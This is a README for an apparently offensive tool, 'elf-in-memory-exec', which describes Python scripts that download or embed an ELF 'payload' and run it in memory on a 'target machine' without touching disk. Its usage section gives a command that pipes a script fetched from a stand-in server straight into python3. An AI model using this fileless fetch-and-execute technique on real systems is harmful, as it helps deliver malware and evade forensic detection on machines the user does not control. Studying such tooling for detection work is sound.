# elf-in-memory-exec

### Introduction

Python3 scripts that executes an elf (linux executable format) completely in memory, nothing is written in disk. All you need is python3 on your host to run it. There are two scripts for two use cases:

- `download_exec_elf_in_memory.py` : Download and execute an elf in memory (payload url must be provided; staged)
- `exec_elf_in_memory.py` : Execute an elf in memory (payload is embedded in the script itself; unstaged)

### Usage

**First**, modify the script on your machine, set the necessary inputs under the `#MAIN CODE` section for whichever script you use. Follow the comments in the code.

**Second**, on target machine, as an example, run:

```
curl http://your-server/exec_elf_in_memory.py | python3
```
